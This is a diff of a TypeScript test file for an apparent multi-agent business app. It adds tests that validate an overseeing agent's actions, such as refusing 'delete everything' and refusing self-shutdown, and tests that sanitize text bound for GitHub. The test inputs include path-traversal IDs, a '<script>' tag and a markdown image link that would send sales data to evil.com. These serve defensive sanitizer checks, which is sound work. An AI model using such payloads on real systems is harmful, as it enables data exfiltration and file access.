@@ -1,6 +1,6 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
-import { BUILTIN_IDS, DEFAULT_STATE, agentsOf, budgetLeft, cleanAgent, newAgentId, scrubPersonal } from "../src/lib/oficina";
+import { BUILTIN_IDS, DEFAULT_STATE, agentsOf, budgetLeft, cleanAction, cleanAgent, describe, newAgentId, scrubPersonal } from "../src/lib/oficina";
 import { costOf, readResp } from "../src/lib/providers/grok";
 
 test("customer text leaves without emails, phones or links", () => {
@@ -12,15 +12,15 @@ test("customer text leaves without emails, phones or links", () => {
 test("built-in agents' shares add up to the whole budget", () => {
   const total = agentsOf(DEFAULT_STATE()).reduce((a, x) => a + x.sharePct, 0);
   assert.equal(total, 100);
-  assert.deepEqual(BUILTIN_IDS, ["ceo", "produccion", "seguridad", "novedades", "soporte"]);
+  assert.deepEqual(BUILTIN_IDS, ["general", "ceo", "produccion", "seguridad", "novedades", "soporte"]);
 });
 
 test("budget left per agent and in total", () => {
   const st = DEFAULT_STATE();
   st.budgetUsd = 30; st.spend.usd = 10; st.spend.byAgent.novedades = 10;
-  const b = budgetLeft(st, { id: "novedades", sharePct: 35 });
+  const b = budgetLeft(st, { id: "novedades", sharePct: 30 });
   assert.equal(b.total, 20);
-  assert.equal(+b.agent.toFixed(2), 0.5); // 35% of 30 = 10.5
+  assert.equal(+b.agent.toFixed(2), -1); // 30% of 30 = 9, already spent 10
 });
 
 test("owner's agents: checked, named, edited instructions win", () => {
@@ -34,7 +34,7 @@ test("owner's agents: checked, named, edited instructions win", () => {
   assert.equal(newAgentId(st, "Márketing!"), "a-marketing-2");
   st.missions.ceo = "Instrucciones nuevas del dueño para el CEO.";
   assert.equal(agentsOf(st).find((x) => x.id === "ceo")!.mission, "Instrucciones nuevas del dueño para el CEO.");
-  assert.equal(agentsOf(st).length, 6);
+  assert.equal(agentsOf(st).length, 7);
 });
 
 test("cost: the API's own figure wins, otherwise tokens, reasoning and searches", () => {
@@ -55,4 +55,25 @@ test("chat files only for safe agent ids", async () => {
   const { SAFE_ID } = await import("../src/lib/oficina");
   for (const ok of ["ceo", "novedades", "a-marketing", "a-marketing-2"]) assert.ok(SAFE_ID.test(ok), ok);
   for (const bad of ["x/../../finanzas", "a-../x", "A-x", "", "a-"]) assert.ok(!SAFE_ID.test(bad), bad);
+});
+
+test("the CEO General's moves are checked before they can be approved", () => {
+  const st = DEFAULT_STATE();
+  assert.equal(cleanAction({ tipo: "borrar_todo" }, st), null);
+  assert.equal(cleanAction({ tipo: "agente", id: "general", on: false }, st), null); // can't switch itself off
+  assert.equal(cleanAction({ tipo: "agente", id: "no-existe", on: false }, st), null);
+  const off = cleanAction({ tipo: "agente", id: "seguridad", on: false, motivo: "x" }, st)!;
+  assert.equal(describe(off), "Apagar el agente seguridad");
+  assert.equal(cleanAction({ tipo: "encargo", titulo: "abc", que: "algo" }, st), null);
+  const e = cleanAction({ tipo: "encargo", titulo: "Registrar costo de texto", problema: "<datos>no</datos>", que: "Guardar el costo de cada llamada de IA de texto por anuncio", para: "Gastón", listo: "Aparece en Rentabilidad" }, st)!;
+  assert.ok(e.tipo === "encargo" && !/[<>]/.test(e.problema));
+  const m = cleanAction({ tipo: "memoria", texto: "Decidido: cobrar con Stripe vía LLC https://x.com/a" }, st)!;
+  assert.ok(m.tipo === "memoria" && !m.texto.includes("http"));
+});
+
+test("assignments sent to GitHub carry no links, images or mentions", async () => {
+  const { plainForIssue } = await import("../src/lib/oficina");
+  const t = plainForIssue("mira ![x](https://evil.com/?d=ventas) y [aquí](https://a.com) @alguien #12 <script>");
+  assert.ok(!/https?:|!\[|@alguien|#12|<script>/.test(t), t);
+  assert.match(t, /aquí/);
 });
